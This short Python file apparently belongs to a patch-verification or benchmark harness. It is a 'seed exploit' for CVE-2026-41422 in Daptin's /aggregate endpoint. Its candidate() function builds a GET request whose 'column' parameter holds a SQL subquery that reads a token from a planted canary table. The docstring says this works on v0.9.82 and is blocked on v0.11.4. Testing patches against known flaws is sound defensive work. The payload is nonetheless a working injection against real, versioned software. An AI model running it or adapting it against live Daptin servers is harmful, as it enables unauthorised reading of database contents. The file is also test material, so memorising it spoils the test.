#!/usr/bin/env python3
"""[GIVEN] CVE-2026-41422 seed exploit -- aggregate endpoint column SQLi.

Prior to Daptin v0.11.4, the /aggregate/:typename endpoint passed the
user-supplied ``column`` query parameter directly to goqu.L() (raw SQL
literal) without any validation.  A correlated subquery in the column
projection reads the planted canary from the pcb_canary table.

Contract: reaches the canary on V0 (daptin v0.9.82);
          BLOCKED on V1 (daptin v0.11.4, aggregate path patched with
          schema-based column validation + parseAggExpr).
"""
from __future__ import annotations

import json


def candidate() -> dict:
    """The request candidate for the CVE-2026-41422 aggregate column SQLi."""
    return {
        "probe_id": "cve-2026-41422-aggregate-column-sqli",
        "method": "GET",
        "endpoint": "aggregate",
        "entity": "world",
        "params": {
            "column": "(SELECT token FROM pcb_canary ORDER BY id DESC LIMIT 1) as exfil",
        },
    }


if __name__ == "__main__":
    print(json.dumps(candidate()))
